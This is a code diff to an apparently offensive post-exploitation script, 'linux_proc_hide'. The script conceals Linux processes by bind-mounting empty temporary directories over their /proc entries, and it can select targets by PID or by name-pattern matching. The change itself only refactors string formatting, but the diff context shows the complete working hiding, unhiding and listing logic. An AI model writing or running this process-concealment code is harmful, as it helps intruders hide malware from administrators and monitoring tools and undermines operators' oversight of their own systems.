@@ -54,34 +54,34 @@ def _mount_source_for(target):
 
 
 def _hide_pid(pid):
-    target = "/proc/%s" % pid
+    target = sprintf("/proc/%s", pid)
     if not exists(target):
-        print("[!] %s not found" % target)
+        print(sprintf("[!] %s not found", target))
         return "ERROR: pid not found"
     shadow = "/tmp/" + _rand_hex(8)
     mkdir(shadow)
     errno = _mount(shadow, target)
     if errno != 0:
         remove(shadow)
-        print("[!] bind mount over %s failed (errno=%d; CAP_SYS_ADMIN required)" % (target, errno))
-        return "ERROR: errno=%d" % errno
-    print("[+] PID %s hidden; %s now shows an empty directory" % (pid, target))
-    print("[*] restore with: linux_proc_hide --action unhide --pid %s" % pid)
+        print(sprintf("[!] bind mount over %s failed (errno=%d; CAP_SYS_ADMIN required)", target, errno))
+        return sprintf("ERROR: errno=%d", errno)
+    print(sprintf("[+] PID %s hidden; %s now shows an empty directory", pid, target))
+    print(sprintf("[*] restore with: linux_proc_hide --action unhide --pid %s", pid))
     return "OK"
 
 
 def _unhide_pid(pid):
-    target = "/proc/%s" % pid
+    target = sprintf("/proc/%s", pid)
     source = _mount_source_for(target)
     if not source:
-        print("[!] %s is not hidden (no bind mount found)" % target)
+        print(sprintf("[!] %s is not hidden (no bind mount found)", target))
         return "ERROR: not hidden"
     errno = _umount(target)
     if errno != 0:
-        print("[!] umount %s failed (errno=%d)" % (target, errno))
-        return "ERROR: errno=%d" % errno
+        print(sprintf("[!] umount %s failed (errno=%d)", target, errno))
+        return sprintf("ERROR: errno=%d", errno)
     remove(source)
-    print("[+] PID %s restored in /proc" % pid)
+    print(sprintf("[+] PID %s restored in /proc", pid))
     return "OK"
 
 
@@ -93,13 +93,13 @@ def _hide_by_name(pattern):
     for pid in list_dir("/proc"):
         if not _is_pid(pid):
             continue
-        comm = read_file("/proc/%s/comm" % pid, default="").strip()
+        comm = read_file(sprintf("/proc/%s/comm", pid), default="").strip()
         if comm and str_contains(comm, pattern):
-            print("[*] %s at PID %s" % (comm, pid))
+            print(sprintf("[*] %s at PID %s", comm, pid))
             _hide_pid(pid)
             hits += 1
     if hits == 0:
-        print("[*] no process matched %s" % pattern)
+        print(sprintf("[*] no process matched %s", pattern))
     return "OK"
 
 
@@ -116,7 +116,7 @@ def _list_hidden():
             continue
         rest = target[len("/proc/"):]
         if _is_pid(rest):
-            print("  PID %s hidden (shadow %s)" % (rest, fields[0]))
+            print(sprintf("  PID %s hidden (shadow %s)", rest, fields[0]))
             found += 1
     if found == 0:
         print("  (none)")
@@ -148,5 +148,5 @@ def main(*args):
         return _hide_by_name(name)
     if action == "list":
         return _list_hidden()
-    print("[!] unknown action: %s" % action)
+    print(sprintf("[!] unknown action: %s", action))
     return "ERROR: unknown action"
